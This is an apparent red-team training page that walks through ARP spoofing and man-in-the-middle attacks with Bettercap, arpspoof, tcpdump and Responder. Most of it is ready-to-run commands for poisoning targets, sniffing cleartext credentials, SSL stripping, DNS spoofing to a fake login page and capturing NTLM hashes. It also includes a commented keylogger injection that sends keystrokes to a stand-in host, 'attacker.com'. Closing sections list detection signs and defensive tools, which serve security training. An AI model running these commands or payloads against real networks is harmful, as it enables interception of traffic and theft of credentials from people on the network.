---
layout: training-page
title: "ARP Spoofing & Bettercap — Red Team Academy"
module: "Network Attacks"
tags:
  - arp
  - mitm
  - bettercap
  - network
  - credential-sniffing
page_key: "network-arp-mitm"
render_with_liquid: false
---

# ARP Spoofing & Bettercap

ARP (Address Resolution Protocol) has no authentication — any host can claim to own any IP address. ARP spoofing poisons the ARP cache of targets to redirect their traffic through the attacker, enabling MITM interception of cleartext protocols, credential capture, and traffic manipulation. Bettercap is the modern toolkit for this.

## How ARP Spoofing Works

```
Normal:
  Victim (192.168.1.5) → ARP: "Who has 192.168.1.1 (gateway)?"
  Gateway             → ARP reply: "192.168.1.1 is at AA:BB:CC:DD:EE:01"

Poisoned:
  Victim (192.168.1.5) → ARP: "Who has 192.168.1.1?"
  Attacker            → ARP reply: "192.168.1.1 is at AA:BB:CC:DD:EE:ATTACKER"
  Gateway (192.168.1.1) → ARP reply: "192.168.1.5 is at AA:BB:CC:DD:EE:ATTACKER"

Result:
  Victim → Attacker → Gateway (attacker sees all victim traffic)
  Gateway → Attacker → Victim (attacker sees all return traffic)
```

## Bettercap Setup

```bash
# Install
apt install bettercap
# Or build from source: github.com/bettercap/bettercap

# Launch interactive REPL
bettercap -iface eth0

# Launch with a caplet (script)
bettercap -iface eth0 -caplet arp-spoof.cap

# Launch with eval commands inline
bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.5; arp.spoof on; net.sniff on"
```

## ARP Poisoning

```bash
# Inside bettercap REPL:

# Discover hosts on subnet
net.probe on
net.show

# Spoof a specific target (victim) → redirect to attacker
set arp.spoof.targets 192.168.1.5
arp.spoof on

# Spoof entire subnet (noisier — use carefully)
set arp.spoof.targets 192.168.1.0/24
arp.spoof on

# Enable IP forwarding to avoid dropping traffic (run as root on host)
# bettercap does this automatically, but verify:
cat /proc/sys/net/ipv4/ip_forward
# Must be 1

# Monitor active spoofing sessions
arp.spoof stats
```

## Credential Sniffing

```bash
# Start sniffer — captures cleartext credentials automatically
net.sniff on

# Bettercap auto-parses and displays credentials from:
# HTTP Basic Auth, FTP, Telnet, SMTP, POP3, IMAP, LDAP (cleartext)
# Also parses NTLM challenges/responses, Kerberos tickets

# Filter to specific protocols
set net.sniff.filter tcp port 21 or tcp port 23 or tcp port 80
net.sniff on

# Log to file
set net.sniff.output /tmp/capture.pcap
net.sniff on

# View captured credentials
net.sniff show
```

## HTTP/HTTPS Proxy

```bash
# Inject HTTP proxy to intercept and modify web traffic
http.proxy on

# HTTPS — requires SSL stripping or cert injection
# Note: HSTS preloading makes SSL stripping ineffective on modern sites
https.proxy on

# Custom JavaScript injection into HTTP responses
set http.proxy.script inject.js
http.proxy on

# Example inject.js — keylogger injection
# (run only on authorized targets)
# window.addEventListener('keydown', function(e) {
#   new Image().src = 'http://attacker.com/log?k=' + e.key;
# });
```

## DNS Spoofing

```bash
# Redirect DNS queries for specific domains to attacker-controlled IP
set dns.spoof.domains target-internal-app.corp.com
set dns.spoof.address 192.168.1.100
dns.spoof on

# Redirect all DNS to attacker (rogue DNS server)
set dns.spoof.all true
dns.spoof on

# Use with a phishing page on 192.168.1.100 for credential capture
```

## Bettercap Caplets (Scripts)

```bash
# caplet file: arp-full.cap
net.probe on
sleep 3
net.show
set arp.spoof.targets 192.168.1.5,192.168.1.6
arp.spoof on
set net.sniff.output /tmp/session.pcap
net.sniff on
set http.proxy on

# Run caplet
bettercap -iface eth0 -caplet arp-full.cap

# Community caplets
# github.com/bettercap/caplets
# Notable: pita.cap (full MITM automation), steal-cookies.cap
```

## Arpspoof (Legacy / Simple)

```bash
# Classic arpspoof — simpler but less capable than bettercap
apt install dsniff

# Enable forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Spoof gateway for victim
arpspoof -i eth0 -t 192.168.1.5 192.168.1.1

# Spoof victim for gateway (bidirectional — run both)
arpspoof -i eth0 -t 192.168.1.1 192.168.1.5

# Capture with tcpdump
tcpdump -i eth0 -w /tmp/capture.pcap host 192.168.1.5
```

## Passive Sniffing (No ARP Required)

```bash
# On a switch port in promiscuous mode (limited — only broadcast + own traffic)
# More effective on hubs or if you've compromised a switch/router

# Bettercap passive sniff
set net.sniff.promiscuous true
net.sniff on

# tcpdump passive
tcpdump -i eth0 -w capture.pcap

# Wireshark filter for credentials
# Display filter: http.authorization || ftp || telnet || smtp.auth
```

## Detection Signals

```
ARP cache poisoning produces:
- Duplicate IP/MAC entries in ARP tables
- Unusual ARP reply frequency (gratuitous ARPs)
- MAC address of default gateway changes
- Detection tools: arpwatch, XArp, dynamic ARP inspection (on managed switches)
```

## Bettercap Modules and Caplets

```bash
# Bettercap is module-based — each capability is a discrete module

# Core modules for MITM work:
# net.probe     — active host discovery (ARP/UDP probes)
# net.recon     — passive host tracking
# arp.spoof     — ARP poisoning (the MITM engine)
# net.sniff     — credential sniffer + PCAP writer
# http.proxy    — transparent HTTP proxy with scripting
# https.proxy   — transparent HTTPS proxy (requires cert)
# dns.spoof     — redirect DNS responses
# events.stream — show all events in real time

# Full interactive MITM session
bettercap -iface eth0

# Inside REPL — ordered setup for a full MITM:
net.probe on                              # discover all hosts
sleep 5                                   # wait for discovery
net.show                                  # list discovered hosts
set arp.spoof.targets 192.168.1.5         # target specific host
set arp.spoof.fullduplex true             # poison both directions
arp.spoof on
set net.sniff.verbose true
set net.sniff.output /tmp/session.pcap
net.sniff on
http.proxy on

# Caplet files — reusable automation scripts
# Save as attack.cap:
cat > /tmp/attack.cap << 'EOF'
net.probe on
sleep 5
net.show
set arp.spoof.targets 192.168.1.5,192.168.1.6
set arp.spoof.fullduplex true
arp.spoof on
set net.sniff.output /tmp/mitm-$(date +%s).pcap
net.sniff on
http.proxy on
EOF

bettercap -iface eth0 -caplet /tmp/attack.cap

# Community caplets (useful references)
# git clone https://github.com/bettercap/caplets
# pita.cap        — full automation (probe + spoof + sniff + proxy)
# steal-cookies.cap — session cookie theft
# ap-mitm.cap     — Wi-Fi MITM caplet
```

## Credential Capture from Common Protocols

```bash
# Bettercap's net.sniff automatically parses and displays credentials from:
# HTTP Basic Auth, FTP, Telnet, SMTP, POP3, IMAP, LDAP (cleartext)
# NTLM challenges/responses, Kerberos tickets (in cleartext segments)

# Protocol-specific credential extraction:

# FTP (port 21) — always cleartext
tcpdump -i eth0 -A 'tcp port 21' 2>/dev/null | grep -E "USER|PASS"
# Or with tshark after capture:
tshark -r session.pcap -Y "ftp.request.command" -T fields \
  -e ip.src -e ftp.request.command -e ftp.request.arg

# HTTP Basic Auth (port 80)
# Authorization: Basic base64(user:pass)
tcpdump -i eth0 -A 'tcp port 80' 2>/dev/null | grep "Authorization: Basic"
# Decode any base64 found:
echo "dXNlcjpwYXNzd29yZA==" | base64 -d

# SMTP AUTH (port 25 / 587)
tcpdump -i eth0 -A 'tcp port 25 or tcp port 587' 2>/dev/null | grep -iE "AUTH|334|235"
# AUTH LOGIN sends base64-encoded username then password

# LDAP cleartext binds (port 389)
tcpdump -i eth0 -A 'tcp port 389' 2>/dev/null | strings | grep -iE "uid=|password|cn="
tshark -r session.pcap -Y "ldap.bindRequest" \
  -T fields -e ip.src -e ldap.name -e ldap.authentication.simple

# Telnet (port 23) — full cleartext session
tcpdump -i eth0 -A 'tcp port 23' 2>/dev/null
# Everything visible: login prompt, typed password, commands executed

# SNMP community strings (port 161 UDP)
tcpdump -i eth0 -A 'udp port 161' 2>/dev/null | strings | grep -v "^$" | head -40
```

## SSL Stripping with Bettercap

```bash
# SSL stripping downgrades HTTPS to HTTP for targets that don't enforce HSTS
# Works by: intercepting initial HTTP response, rewriting HTTPS links to HTTP

# Enable https.proxy with ssl stripping
# First, generate or obtain a CA certificate Bettercap will use
# (or use the built-in — browsers will show warning unless cert is trusted)

# Inside bettercap REPL:
set https.proxy.sslstrip true
set arp.spoof.targets 192.168.1.5
arp.spoof on
https.proxy on
net.sniff on

# sslstrip2 / hsts stripping approach
# github.com/LeonardoNve/sslstrip2
# Only effective against sites not in the HSTS preload list
# Internal web apps and old intranets often lack HSTS — focus there

# Check if HSTS is set on a target
curl -sI https://target.corp.local | grep -i strict-transport
# No HSTS header = strippable

# Bettercap script to log strippable HTTP credentials
set http.proxy.script /usr/share/bettercap/caplets/log-http-creds.js
http.proxy on
```

## Selective ARP Poisoning

```bash
# Poisoning the entire subnet is noisy and risks disrupting services
# Target specific hosts for minimum footprint

# Single host pair: poison only the victim's gateway entry
# (victim → attacker for outbound traffic)
set arp.spoof.targets 192.168.1.50       # victim IP only
set arp.spoof.fullduplex true             # also poison gateway's ARP for victim IP
arp.spoof on

# Multiple specific hosts (not entire subnet)
set arp.spoof.targets 192.168.1.50,192.168.1.51,192.168.1.52
arp.spoof on

# Whitelist — exclude critical infrastructure from poisoning
set arp.spoof.whitelist 192.168.1.1,192.168.1.10   # gateway, DC — never poison these
arp.spoof on

# Manual selective ARP with arpspoof (precise control)
echo 1 > /proc/sys/net/ipv4/ip_forward
# Tell victim (192.168.1.50) that gateway (192.168.1.1) is at attacker MAC
arpspoof -i eth0 -t 192.168.1.50 192.168.1.1 &
# Tell gateway (192.168.1.1) that victim (192.168.1.50) is at attacker MAC
arpspoof -i eth0 -t 192.168.1.1 192.168.1.50 &

# Cleanup — restore ARP tables when done
# arpspoof sends restore packets on SIGINT (Ctrl+C)
# Or manually:
arping -c 3 -I eth0 -s 192.168.1.1 192.168.1.50   # restore victim
arping -c 3 -I eth0 -s 192.168.1.50 192.168.1.1   # restore gateway
```

## DNS Spoofing via ARP MITM

```bash
# Once you're MITM on the traffic path, redirect DNS answers
# to send victims to attacker-controlled servers

# Bettercap DNS spoofing — inside REPL after arp.spoof is on:
set dns.spoof.domains intranet.corp.local,sharepoint.corp.local
set dns.spoof.address 192.168.1.99     # attacker IP to return
dns.spoof on

# Spoof all DNS (all names resolve to attacker)
set dns.spoof.all true
set dns.spoof.address 192.168.1.99
dns.spoof on

# Combined: ARP MITM + DNS spoof + fake HTTP server
# Step 1: arp.spoof on (positions as MITM)
# Step 2: dns.spoof on (redirects target domain to attacker IP)
# Step 3: Serve a credential harvesting page on attacker IP
# Install Apache/nginx and put a fake login page at 192.168.1.99

# Serve a fake NTLM auth page (captures NTLMv2 from Windows)
responder -I eth0   # Responder acts as SMB + HTTP server capturing auth
# With DNS spoof pointing to attacker, victims authenticate to Responder

# Dnsspoof (legacy, simpler)
# Create hosts file: target.corp.local 192.168.1.99
dnsspoof -i eth0 -f /tmp/hosts.txt
```

## Detection: ARP Cache Anomaly Detection

```
ARP anomaly indicators:
  - Gratuitous ARP (unsolicited ARP reply) frequency spike
    Normal: 0-2 gratuitous ARPs per host per hour
    Anomalous: dozens per minute from same MAC

  - MAC address change for default gateway IP
    Baseline: gateway IP consistently maps to same MAC
    Anomalous: gateway IP suddenly maps to different MAC (attacker)

  - Duplicate MAC serving multiple IPs
    One physical MAC claiming to be multiple IPs = bridge or proxy

  - ARP reply without prior ARP request
    (gratuitous ARP poisoning — attacker sending unsolicited replies)

Network security tools:
  - arpwatch: monitors ARP table, alerts on changes; sends email on flip-flop
    apt install arpwatch && arpwatch -i eth0
  - XArp: GUI tool for ARP anomaly detection (Windows/Linux)
  - Dynamic ARP Inspection (DAI) on managed Cisco/Aruba switches:
    Validates ARP packets against DHCP snooping binding table
    Command: ip arp inspection vlan 10

XDR / NDR detection:
  - Darktrace, Vectra, ExtraHop flag: host acting as gateway to other hosts
  - Unusual traffic volume through single endpoint (all traffic routing through victim)
  - Duplicate IP/MAC mappings logged by network infrastructure
  - SSL certificate mismatch alerts (from ssl stripping / proxy cert)
```

## Resources

- Bettercap — `bettercap.org` / `github.com/bettercap/bettercap`
- Bettercap caplets — `github.com/bettercap/caplets`
- MITRE T1557.002 — ARP Cache Poisoning — `attack.mitre.org/techniques/T1557/002/`
- MITRE T1040 — Network Sniffing — `attack.mitre.org/techniques/T1040/`
- dsniff suite — `monkey.org/~dugsong/dsniff/`
- arpwatch — `ee.lbl.gov/`
